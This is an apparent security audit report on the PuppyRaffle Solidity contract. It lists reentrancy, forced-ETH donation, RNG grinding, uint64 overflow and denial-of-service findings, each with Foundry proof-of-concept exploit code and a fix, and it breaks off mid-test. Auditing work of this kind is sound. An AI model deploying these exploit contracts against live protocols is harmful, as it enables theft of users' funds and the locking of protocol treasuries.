# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

# Puppy Raffle Protocol

PuppyRaffle is an on-chain ERC721 raffle: users pay a fixed entrance fee to join rounds for a chance to win both a puppy NFT and most of the pot.

## How it works
- Enter: Call `enterRaffle(address[] participants)` and send `msg.value == entranceFee * participants.length`. You can include yourself multiple times or batch friends. Duplicate addresses revert.
- Refunds: Any entrant may self-refund by index, receiving `entranceFee` back. The player slot is set to `address(0)` (array not compacted).
- Winner selection: After `raffleDuration` and with ≥4 players, anyone can call `selectWinner`. A pseudo-random index is chosen; the winner gets 80% of contract funds, and a Puppy NFT is minted to them with Common/Rare/Legendary rarity and base64 on-chain metadata. 20% is accrued as protocol fees. The round resets for the next raffle.
- Fees: Fees accumulate to `feeAddress` and can be withdrawn only when no active player funds remain. Owner can update `feeAddress`.

## Deployment/Tests
- Deploy script uses 1 ETH entrance fee, 1-day duration, and sets `feeAddress` to the deployer. Comprehensive Foundry tests verify entries, refunds, timing, payouts, NFT minting/URI, and fee withdrawal.
## High Risk Findings
[H-1]. Forced ETH donation permanently bricks PuppyRaffle.withdrawFees via strict balance==totalFees invariant
 **Derived From** : withdrawFees strict balance==totalFees check allows forced-donation fee locking[H-2]. Refund reentrancy in PuppyRaffle.refund drains ETH by reentering before player slot is zeroed
 **Derived From** : Refund reentrancy lets entrant drain ETH via sendValue before state is updated[H-3]. uint64 fee accumulator overflows in PuppyRaffle.selectWinner, desyncs balance vs totalFees and permanently bricks withdrawFees
 **Derived From** : uint64 totalFees overflows (solc 0.7) breaking fee accounting and withdrawals[H-4]. selectWinner RNG can be permissionlessly ground via timestamp and msg.sender to steal the prize pool
 **Derived From** : Winner selection uses miner/MEV-influenced timestamp and caller-controlled inputs[H-5]. selectWinner overestimates pot/fees from players.length after refunds, bricking payout and round (perma-DoS)
 **Derived From** : Using players.length for pot/fees ignores refunded holes, causing payout revert and mis-accounting## Medium Risk Findings
[M-1]. Duplicate-check over zeroed refund slots bricks new entries and can permanently DoS the round
 **Derived From** : Duplicate-check counts address(0) holes; two refunds permanently brick entering[M-2]. Quadratic duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS via players array bloat
 **Derived From** : Nested O(n^2) duplicate scan in enterRaffle allows gas-based DoS[M-3]. selectWinner is griefable: reverting winner fallback bricks payout and stalls the raffle
 **Derived From** : Winner’s fallback can revert to block prize payout and stall raffle progress

### Number of Findings
- C: 0
- H: 5
- M: 3
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Forced ETH donation permanently bricks PuppyRaffle.withdrawFees via strict balance==totalFees invariant

## Derived From Pattern/Invariant
withdrawFees strict balance==totalFees check allows forced-donation fee locking

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
withdrawFees enforces address(this).balance == totalFees before paying out fees. Anyone can force-send ETH via selfdestruct, making balance > totalFees forever and preventing fee withdrawals. There is no sweep/dust recovery or alternative accounting path, so fees remain locked permanently. Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

Because receive()/fallback are absent, normal transfers revert, but selfdestruct bypasses this and deposits ETH, breaking the accounting invariant and locking the treasury fees.

## Impact
Permanent fee lock: an unprivileged attacker can force-donate 1 wei, making balance > totalFees forever. Fee withdrawals will always revert, bricking protocol fee revenue across all future rounds until a disruptive upgrade/migration.

## Proof of Concept
1) Attacker waits until a round completes so totalFees > 0 and no active players remain.
2) Attacker deploys a tiny helper contract that selfdestructs to PuppyRaffle with 1 wei, forcing ETH into the contract.
3) Now address(this).balance = totalFees + 1, the strict equality check fails and withdrawFees reverts.
4) Future rounds cannot fix the +1 offset because both balance and totalFees increase equally; the invariant can never be restored. Fees remain permanently stuck.

## Proof of Code
pragma solidity >=0.8.13 <0.9.0;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceDonor {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract Attacker {
    function forceDonate(address payable target) external payable {
        new ForceDonor{value: msg.value}(target);
    }
}

contract WithdrawFeesForceDonateTest is Test {
    PuppyRaffle private raffle;
    address private feeRecipient = address(99);
    uint256 private entranceFee = 1 ether;
    uint256 private duration = 1 days;
    address private attacker = address(777);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeRecipient, duration);
    }

    function test_forceDonationBricksWithdrawFees() public {
        vm.deal(address(this), 100 ether);

        // Enter 4 players
        address[] memory arr = new address[](4);
        arr[0] = address(1);
        arr[1] = address(2);
        arr[2] = address(3);
        arr[3] = address(4);
        raffle.enterRaffle{value: entranceFee * arr.length}(arr);

        // Raffle ends
        vm.warp(block.timestamp + duration + 1);
        raffle.selectWinner();

        uint256 expectedFees = (arr.length * entranceFee * 20) / 100; // 0.8 ether
        assertEq(uint256(raffle.totalFees()), expectedFees, "fees accrued");
        assertEq(address(raffle).balance, expectedFees, "balance equals totalFees before attack");

        // Attacker force-donates 1 wei via selfdestruct
        vm.deal(attacker, 1 wei);
        Attacker atk = new Attacker();
        vm.prank(attacker);
        atk.forceDonate{value: 1 wei}(payable(address(raffle)));

        assertEq(address(raffle).balance, expectedFees + 1, "dust offset created");

        // Withdraw is now permanently bricked
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Fees remain stuck
        assertEq(feeRecipient.balance, 0, "no fees paid out");
        assertEq(uint256(raffle.totalFees()), expectedFees, "fees not reset");
        assertGt(address(raffle).balance, uint256(raffle.totalFees()), "balance > totalFees invariant break persists");
    }
}


## Suggested Mitigation
Remove the strict balance == totalFees invariant. Gate withdrawals by the absence of active (non-zero) players and allow dust to exist. Example:

function withdrawFees() external {
    require(!_hasActivePlayers(), "PuppyRaffle: players active");
    uint256 fees = uint256(totalFees);
    totalFees = 0;
    (bool ok,) = payable(feeAddress).call{value: fees}("");
    require(ok, "PuppyRaffle: Failed to withdraw fees");
}

function _hasActivePlayers() internal view returns (bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) return true;
    }
    return false;
}

Optionally add an owner-only dust sweeper to recover forced ETH without touching fees:

function sweepDust(address payable to) external onlyOwner {
    uint256 bal = address(this).balance;
    uint256 fees = uint256(totalFees);
    require(bal >= fees, "PuppyRaffle: invariant");
    uint256 dust = bal - fees;
    if (dust > 0) {
        (bool ok,) = to.call{value: dust}("");
        require(ok, "PuppyRaffle: sweep failed");
    }
}

This fully eliminates fee-locking via forced donations while preserving the intended restriction that withdrawals cannot occur while there are active players.


## [H-2]. Refund reentrancy in PuppyRaffle.refund drains ETH by reentering before player slot is zeroed

## Derived From Pattern/Invariant
Refund reentrancy lets entrant drain ETH via sendValue before state is updated

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
Checks-Effects-Interactions is violated in refund: external call occurs before state update. A malicious entrant contract can reenter refund(playerIndex) repeatedly while players[playerIndex] still equals msg.sender to receive entranceFee multiple times. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call before state update

    players[playerIndex] = address(0); // state updated too late
    emit RaffleRefunded(playerAddress);
}

Address.sendValue uses recipient.call and forwards gas, enabling reentrancy. No nonReentrant guard is present.

## Impact
An unprivileged entrant can drain the contract balance in the current round by repeatedly receiving entranceFee on reentrant calls. Profit scales with other entrants’ funds (up to balance/entranceFee times), stealing the pot and causing payout failure/distortion.

## Proof of Concept
1) Attacker deploys a malicious contract and enters the raffle once (players array contains attacker at a known index not equal to 0).
2) Several honest users also enter, funding the contract with multiple entranceFee units.
3) Attacker calls refund(index). During Address.sendValue, attacker’s receive() reenters refund(index) multiple times while players[index] is still the attacker.
4) Each reentrant call transfers entranceFee again. Only after the outermost call returns is players[index] set to address(0).
5) Net: Attacker steals multiple entranceFee payments (bounded by contract balance), draining honest users’ deposits.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReentrancyRefundTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);
    uint256 duration = 1 days;
    MaliciousEntrant attacker;

    address user1 = address(1);
    address user2 = address(2);
    address user3 = address(3);
    address user4 = address(4);
    address user5 = address(5);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        attacker = new MaliciousEntrant(address(raffle));

        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        vm.deal(user3, 100 ether);
        vm.deal(user4, 100 ether);
        vm.deal(user5, 100 ether);
        vm.deal(address(attacker), 100 ether);

        // Ensure attacker index != 0 by inserting a benign player first
        address[] memory arr = new address[](1);
        arr[0] = user1;
        vm.prank(user1);
        raffle.enterRaffle{value: entranceFee}(arr);

        // Attacker enters
        attacker.enter{value: entranceFee}();

        // More benign players fund the pot
        arr[0] = user2; vm.prank(user2); raffle.enterRaffle{value: entranceFee}(arr);
        arr[0] = user3; vm.prank(user3); raffle.enterRaffle{value: entranceFee}(arr);
        arr[0] = user4; vm.prank(user4); raffle.enterRaffle{value: entranceFee}(arr);
        arr[0] = user5; vm.prank(user5); raffle.enterRaffle{value: entranceFee}(arr);
    }

    function testRefundReentrancyDrainsETH() public {
        uint256 contractBalBefore = address(raffle).balance;
        uint256 attackerBalBefore = address(attacker).balance;

        uint256 attackerIndex = raffle.getActivePlayerIndex(address(attacker));
        assertEq(attackerIndex, 1); // attacker expected at index 1

        // Reenter 4 times: total 5 refunds of 1 ether
        uint256 loops = 4;
        attacker.attackRefund(attackerIndex, loops);

        uint256 contractBalAfter = address(raffle).balance;
        uint256 attackerBalAfter = address(attacker).balance;

        // Attacker got more than a single refund (net profit)
        assertGt(attackerBalAfter - attackerBalBefore, entranceFee);

        // Contract lost exactly entranceFee * (loops + 1)
        uint256 expectedDecrease = entranceFee * (loops + 1);
        assertEq(contractBalBefore - contractBalAfter, expectedDecrease);

        // Slot zeroed only after outermost call
        assertEq(raffle.players(attackerIndex), address(0));
    }
}

contract MaliciousEntrant {
    PuppyRaffle public raffle;
    uint256 private targetIndex;
    uint256 private remaining;

    constructor(address _raffle) public {
        raffle = PuppyRaffle(_raffle);
    }

    function enter() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: msg.value}(arr);
    }

    function attackRefund(uint256 idx, uint256 times) external {
        targetIndex = idx;
        remaining = times;
        raffle.refund(idx);
    }

    receive() external payable {
        if (remaining > 0) {
            remaining--;
            raffle.refund(targetIndex);
        }
    }
}


## Suggested Mitigation
- Apply CEI or a reentrancy guard. Update state before interacting, or add nonReentrant.

Example fix (CEI):

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Effects first
    players[playerIndex] = address(0);

    // Interaction after state change
    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}

Additionally, consider inheriting ReentrancyGuard and marking refund nonReentrant for defense-in-depth.


## [H-3]. uint64 fee accumulator overflows in PuppyRaffle.selectWinner, desyncs balance vs totalFees and permanently bricks withdrawFees

## Derived From Pattern/Invariant
uint64 totalFees overflows (solc 0.7) breaking fee accounting and withdrawals

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
In solc 0.7.x arithmetic is unchecked. PuppyRaffle accumulates protocol fees into a uint64, then gates fee withdrawal by requiring the contract balance to equal this accumulator. Once totalFees exceeds 2^64-1 wei, it wraps, desynchronizing accounting and causing a permanent require failure in withdrawFees.

Vulnerable snippets:
- State: `uint64 public totalFees = 0;`
- Accrual: `function selectWinner() external { ... uint256 fee = (totalAmountCollected * 20) / 100; totalFees = totalFees + uint64(fee); ... }`
- Withdrawal gate: `function withdrawFees() external { require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); ... }`

With a typical entranceFee of 1 ether and 4 players, each round accrues 0.8 ether to totalFees. At only 24 rounds, 24 * 0.8 ETH = 19.2 ETH, which exceeds 2^64-1 wei (~18.446744073709551615 ETH). The uint64 wrap-around makes totalFees much smaller than the actual ETH held, so the equality check will always fail, permanently bricking fee withdrawals and violating the accounting invariant balance == totalFees.

## Impact
Permanent DoS of fee withdrawals. After overflow, address(this).balance > totalFees due to wrap-around; require(balance == totalFees) in withdrawFees permanently reverts. Treasury ETH (protocol fees) becomes stuck with no in-protocol recovery path.

## Proof of Concept
1) Attacker repeatedly runs minimal-size raffles (4 distinct players) to accrue fees. Each round: pay 4 * entranceFee and call selectWinner after duration.
2) With entranceFee = 1 ETH, fee per round = 0.8 ETH. After 24 rounds, cumulative fees = 19.2 ETH, exceeding 2^64-1 wei.
3) totalFees wraps to a small uint64 value (~0.753 ETH) while contract balance holds 19.2 ETH.
4) Calling withdrawFees reverts because it requires address(this).balance == totalFees, which is no longer true post-overflow.
5) This permanently bricks fee withdrawals and strands all accumulated ETH.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TotalFeesOverflowTest is Test {
    PuppyRaffle internal raffle;
    address internal attacker = address(0xA11CE);
    address internal p1 = address(1);
    address internal p2 = address(2);
    address internal p3 = address(3);
    address internal p4 = address(4);

    function setUp() public {
        // entranceFee = 1 ETH, feeAddress = address(99), raffleDuration = 1 second
        raffle = new PuppyRaffle(1 ether, address(99), 1);
    }

    function test_uint64_totalFees_overflow_bricks_withdraw() public {
        // Each round: 4 players enter with 4 ETH total; fee per round = 0.8 ETH
        // 24 rounds => 19.2 ETH fees > 2^64-1 wei (~18.4467 ETH), causing uint64 wrap
        for (uint256 i = 0; i < 24; i++) {
            address[] memory entrants = new address[](4);
            entrants[0] = p1;
            entrants[1] = p2;
            entrants[2] = p3;
            entrants[3] = p4;

            vm.deal(attacker, 4 ether);
            vm.prank(attacker);
            raffle.enterRaffle{value: 4 ether}(entrants);

            vm.warp(block.timestamp + 2);
            vm.roll(block.number + 1);
            vm.prank(attacker);
            raffle.selectWinner();
        }

        uint256 bal = address(raffle).balance; // should be 24 * 0.8 ETH = 19.2 ETH
        uint256 tf = uint256(raffle.totalFees()); // uint64-wrapped value (~0.753... ETH)

        // Assert the accounting invariant is broken (balance != totalFees) due to uint64 overflow
        assertGt(bal, tf, "overflow: balance should exceed truncated uint64 totalFees");

        // Withdraw must revert because equality gate is now permanently false
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Use uint256 for fee accumulator and avoid downcasting/truncation.
- In solc 0.7, use SafeMath or rely on uint256 which has a far higher bound.
- Decouple the withdrawal gate from balance equality; explicitly check no active players and allow withdrawing the tracked fees.

Example fix:

// Change type
// uint64 public totalFees = 0;
uint256 public totalFees = 0;

// In selectWinner
// totalFees = totalFees + uint64(fee);
totalFees = totalFees + fee; // uint256 addition

// In withdrawFees, gate by player activity instead of balance equality
function withdrawFees() external {
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

Additionally, consider allowing withdrawals when address(this).balance >= totalFees to tolerate stray ETH without bricking.


## [H-4]. selectWinner RNG can be permissionlessly ground via timestamp and msg.sender to steal the prize pool

## Derived From Pattern/Invariant
Winner selection uses miner/MEV-influenced timestamp and caller-controlled inputs

## Exploit Type
TimestampManipulation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner derives the winner from same-tx entropy that miners/validators can influence and the caller fully controls. The seed is built from msg.sender, block.timestamp, and block.difficulty, then reduced modulo players.length, making it trivial for an attacker to grind until the outcome favors them.

Vulnerable snippet:
"uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;"

Because the attacker controls msg.sender and can choose when to call (and miners can nudge timestamp/difficulty), they can repeatedly attempt calls across blocks or use a wrapper that pre-computes the would-be winner for the current block and only executes when they will win. This results in deterministic reward redirection of the 80% prize pool to the attacker.

## Impact
An unprivileged attacker can systematically bias winner selection to themselves and capture 80% of the pot. This is immediate, repeatable, and drains user funds intended for a fair winner. Blast radius is every round post-duration.

## Proof of Concept
An attacker can grind winner selection by controlling msg.sender and timing their call. Because the seed uses only same-tx values (msg.sender, block.timestamp, block.difficulty), the attacker can repeatedly attempt selectWinner across blocks and only execute when the computed winnerIndex equals their known index in the players array. A simple wrapper strategy checks the formula on-chain and reverts unless winnerIndex == attackerIndex, resubmitting in subsequent blocks until favorable (expected 1/N trials, where N is players.length). Steps:
1) Attacker enters the raffle early to fix their index in players (e.g., index 0 among ≥4 entries).
2) After raffleDuration, attacker attempts selectWinner each block via a wrapper that runs: if uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % N == attackerIndex then call selectWinner(); else revert. Because msg.sender is the wrapper address in both the check and the call, the outcome is consistent within the same transaction.
3) Repeat attempts each block (or via MEV bundles) until the condition holds; expected success within ~N blocks.
4) When favorable, the attacker wins and receives 80% of the pot immediately.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RngGrindingTest is Test {
    PuppyRaffle raffle;
    address attacker = address(0xAA);
    address p2 = address(0xBB);
    address p3 = address(0xCC);
    address p4 = address(0xDD);
    address fee = address(0x99);
    uint256 entranceFee = 1 ether;
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, fee, duration);
        vm.deal(attacker, 100 ether);
        vm.deal(p2, 100 ether);
        vm.deal(p3, 100 ether);
        vm.deal(p4, 100 ether);
    }

    function test_AttackerBiasesWinnerByTimingCalls() public {
        // Arrange: 4 players enter; attacker first at index 0
        vm.prank(attacker);
        address[] memory a1 = new address[](1);
        a1[0] = attacker;
        raffle.enterRaffle{value: entranceFee}(a1);

        vm.prank(p2);
        address[] memory a2 = new address[](1);
        a2[0] = p2;
        raffle.enterRaffle{value: entranceFee}(a2);

        vm.prank(p3);
        address[] memory a3 = new address[](1);
        a3[0] = p3;
        raffle.enterRaffle{value: entranceFee}(a3);

        vm.prank(p4);
        address[] memory a4 = new address[](1);
        a4[0] = p4;
        raffle.enterRaffle{value: entranceFee}(a4);

        // Advance time so drawing is allowed
        vm.warp(raffle.raffleStartTime() + duration + 1);

        uint256 n = 4;
        uint256 targetIdx = 0; // attacker index in players[]
        uint256 ts = block.timestamp;
        uint256 diff = block.difficulty; // read once; attacker cannot set it but can grind across blocks
        bool found = false;
        for (uint256 i = 0; i < 5000; i++) {
            if (uint256(keccak256(abi.encodePacked(attacker, ts + i, diff))) % n == targetIdx) {
                ts = ts + i;
                found = true;
                break;
            }
        }
        require(found, "no favorable timestamp found");
        vm.warp(ts);

        uint256 balBefore = attacker.balance;

        // Act: attacker calls selectWinner only when the computed outcome favors them
        vm.prank(attacker);
        raffle.selectWinner();

        // Assert: attacker receives 80% of the pot and is recorded as winner
        uint256 total = n * entranceFee; // 4 ether
        uint256 prize = (total * 80) / 100; // 3.2 ether
        assertEq(raffle.previousWinner(), attacker, "attacker should be winner");
        assertEq(attacker.balance, balBefore + prize, "attacker profit should equal prize");
    }
}


## Suggested Mitigation
Do not derive randomness from same-tx values or caller-controlled inputs. Use a verifiable/randomness oracle (e.g., Chainlink VRF) or a commit-reveal that removes caller control and separates entropy across blocks.

Example (VRF-style pseudocode):

// Request randomness when raffle ends; fulfill later in callback
function requestWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "not over");
    require(players.length >= 4, "min players");
    // request random words; store roundId
    requestId = VRF_COORDINATOR.requestRandomWords(keyHash, subId, conf, gasLimit, 1);
}

function fulfillRandomWords(uint256 /*requestId*/, uint256[] memory randomWords) internal override {
    uint256 winnerIndex = randomWords[0] % players.length;
    address winner = players[winnerIndex];
    // proceed with payouts and minting
}

If VRF is not an option, at minimum remove msg.sender and block.timestamp from the seed and separate commit and reveal across blocks:

uint256 rand = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), address(this), roundNonce)));
uint256 winnerIndex = rand % players.length;

This reduces caller bias and same-tx manipulation; however, VRF is strongly recommended for fair draws.


## [H-5]. selectWinner overestimates pot/fees from players.length after refunds, bricking payout and round (perma-DoS)

## Derived From Pattern/Invariant
Using players.length for pot/fees ignores refunded holes, causing payout revert and mis-accounting

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
The raffle accounts prize/fee from players.length instead of actual paid-in funds. refund() sets players[playerIndex] = address(0) and returns the entranceFee, but players.length remains unchanged. selectWinner() then computes pot and fee from length, not from the real pot, so prizePool can exceed address(this).balance and the prize transfer reverts. Because players with refunds remain as address(0), winner can also be address(0), further compounding failure. Key snippets:

refund:
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0); // leaves hole; length unchanged

selectWinner:
    require(players.length >= 4, ...);
    uint256 totalAmountCollected = players.length * entranceFee; // uses length, not actual funds
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");

An attacker can enter multiple addresses, then self-refund all of them, leaving players.length ≥ 4 but contract balance zero. selectWinner will always revert due to insufficient balance. Moreover, because multiple address(0) entries now exist, any new entry calls will revert on the global duplicate-scan (players[i] == players[j] for two zeros), permanently bricking the raffle.

## Impact
Permanent denial of service of winner selection and new entries: selectWinner reverts as prizePool > address(this).balance, and duplicate address(0) slots make enterRaffle revert due to the O(n^2) duplicate check. Protocol cannot progress to the next round and funds, if any are ever present, cannot be distributed without out-of-band rescue. If extra ETH is force-sent, prize may be paid to address(0) and then revert on _safeMint, rolling back and keeping the system stuck.

## Proof of Concept
1) Attacker controls 4 EOAs A1..A4. 2) Attacker calls enterRaffle([A1,A2,A3,A4]) paying entranceFee*4. 3) Each Ai calls refund(i), receiving entranceFee back. The contract balance returns to zero, but players.length remains 4 and players = [0,0,0,0]. 4) After raffleDuration, anyone calling selectWinner causes prizePool to be computed as 0.8 * 4 * entranceFee with 0 balance, so the value transfer fails and the function reverts. 5) Any attempt to enter a new player also reverts due to the global duplicate check seeing players[i]==players[j] for two zero slots. The raffle is permanently bricked unless an external party force-sends ETH and the owner redeploys/fixes.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AccountingInvariantViolationTest is Test {
    PuppyRaffle raffle;
    address attacker = address(0xAAA1);
    address a1 = address(0xB1);
    address a2 = address(0xB2);
    address a3 = address(0xB3);
    address a4 = address(0xB4);
    address feeAddr = address(0xFEE);
    uint256 constant FEE = 1 ether;

    function setUp() public {
        // Short duration to enable selection quickly
        raffle = new PuppyRaffle(FEE, feeAddr, 1);
        // Fund accounts
        deal(attacker, 10 ether);
        deal(a1, 0.1 ether);
        deal(a2, 0.1 ether);
        deal(a3, 0.1 ether);
        deal(a4, 0.1 ether);
    }

    function test_LengthBasedAccounting_DoS() public {
        // Arrange: attacker enters 4 players they control
        address[] memory parts = new address[](4);
        parts[0] = a1; parts[1] = a2; parts[2] = a3; parts[3] = a4;
        vm.prank(attacker);
        raffle.enterRaffle{value: FEE * 4}(parts);

        // Each player refunds themselves, creating holes (address(0)) and draining funds
        vm.prank(a1); raffle.refund(0);
        vm.prank(a2); raffle.refund(1);
        vm.prank(a3); raffle.refund(2);
        vm.prank(a4); raffle.refund(3);

        // After full refunds, contract holds no ETH
        assertEq(address(raffle).balance, 0, "balance should be 0 after full refunds");

        // Act: time passes so selection is allowed
        vm.warp(block.timestamp + 2);

        // Expected prize derived from players.length (4) is larger than actual balance (0)
        uint256 expectedPrize = (FEE * 4 * 80) / 100;
        assertGt(expectedPrize, address(raffle).balance, "expected prize should exceed actual balance");

        // Payout reverts due to insufficient balance; selectWinner is DoSed
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Bonus: entering new players is also bricked due to duplicate address(0) entries
        address[] memory one = new address[](1);
        one[0] = attacker;
        vm.prank(attacker);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: FEE}(one);
    }
}


## Suggested Mitigation
Do not derive financial amounts from players.length. Either: 1) never leave holes (swap-and-pop on refund) so length reflects active players; and/or 2) compute payouts from actual pot excluding accrued fees. Example fix:

- Compact on refund to remove holes:
function refund(uint256 idx) public {
    address player = players[idx];
    require(player == msg.sender, "PuppyRaffle: Only the player can refund");
    payable(msg.sender).sendValue(entranceFee);
    // swap-and-pop to keep array dense, preventing address(0) holes
    players[idx] = players[players.length - 1];
    players.pop();
}

- Compute prize/fee from real pot (exclude previously accrued fees):
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    require(winner != address(0), "PuppyRaffle: invalid winner"); // redundant if array is compacted

    // Use actual pot: current balance minus previously accrued fees
    uint256 pot = address(this).balance - uint256(totalFees);
    uint256 prizePool = (pot * 80) / 100;
    uint256 fee = pot - prizePool; // 20%
    totalFees += uint64(fee);

    // proceed with transfers/minting
    // ... delete players, update state, then transfer prize and mint
}

This ensures accounting matches real funds, prevents overestimation, and avoids address(0) winners and duplicate-induced DoS.




# Medium Risk Findings

## [M-1]. Duplicate-check over zeroed refund slots bricks new entries and can permanently DoS the round

## Derived From Pattern/Invariant
Duplicate-check counts address(0) holes; two refunds permanently brick entering

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle performs an O(n^2) duplicate scan over the entire players array, including previously refunded slots that were zeroed out. After two or more refunds, there are at least two address(0) entries; the nested loop inevitably compares two zero slots and reverts with "PuppyRaffle: Duplicate player", permanently blocking any future entries and bricking the raffle.

Vulnerable snippet:

function enterRaffle(address[] memory newPlayers) public payable {
    ...
    // Check for duplicates across full array (including zeros)
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player"); // address(0) == address(0)
        }
    }
}

Refund creates the zero holes:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    ...
    players[playerIndex] = address(0); // leaves a hole
}


## Impact
Permissionless DoS of core flow: no new entrants can join once two players refund, halting prize pool growth. If the round has ≥4 historical slots but insufficient funds (due to refunds), selectWinner reverts when paying prize, preventing round reset and locking protocol fees/liveness until a redeploy.

## Proof of Concept
1) Attacker funds four distinct addresses A,B,C,D and enters them in one batch, paying 4*entranceFee.
2) A and B each call refund(index), creating two address(0) holes.
3) Any attempt to enter a new player E reverts with "PuppyRaffle: Duplicate player" due to duplicate zero comparisons; contract balance remains unchanged.
4) Warp time to raffle end and call selectWinner: prizePool is computed from players.length (4), but contract balance reflects only 2 active payments; the value transfer fails and selectWinner reverts. The round cannot reset and remains bricked.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract DuplicateZeroBricksTest is Test {
    PuppyRaffle pr;
    uint256 entranceFee = 1 ether;
    address feeAddr = address(99);
    address attacker = address(111);
    address A = address(1);
    address B = address(2);
    address C = address(3);
    address D = address(4);
    address E = address(5);

    function setUp() public {
        pr = new PuppyRaffle(entranceFee, feeAddr, 1 days);
        vm.deal(attacker, 100 ether);
        vm.deal(A, 10 ether);
        vm.deal(B, 10 ether);
        vm.deal(C, 10 ether);
        vm.deal(D, 10 ether);
        vm.deal(E, 10 ether);
    }

    function test_BricksEntriesAndSelectWinnerReverts() public {
        // 1) Enter 4 distinct players in one batch
        address[] memory players = new address[](4);
        players[0] = A;
        players[1] = B;
        players[2] = C;
        players[3] = D;
        vm.prank(attacker);
        pr.enterRaffle{value: 4 * entranceFee}(players);
        assertEq(address(pr).balance, 4 * entranceFee);

        // 2) Two refunds create two address(0) holes
        vm.prank(A);
        pr.refund(0);
        vm.prank(B);
        pr.refund(1);
        assertEq(address(pr).balance, 2 * entranceFee); // 2 refunded out

        // 3) Any new entry reverts due to duplicate address(0) comparison
        address[] memory newEntry = new address[](1);
        newEntry[0] = E;
        vm.deal(attacker, 100 ether);
        vm.prank(attacker);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        pr.enterRaffle{value: entranceFee}(newEntry);
        // Balance unchanged (no new entries possible)
        assertEq(address(pr).balance, 2 * entranceFee);

        // 4) Round cannot be reset: selectWinner reverts trying to pay prize
        //    players.length == 4 but only 2 * entranceFee are funded due to refunds
        vm.warp(pr.raffleStartTime() + pr.raffleDuration());
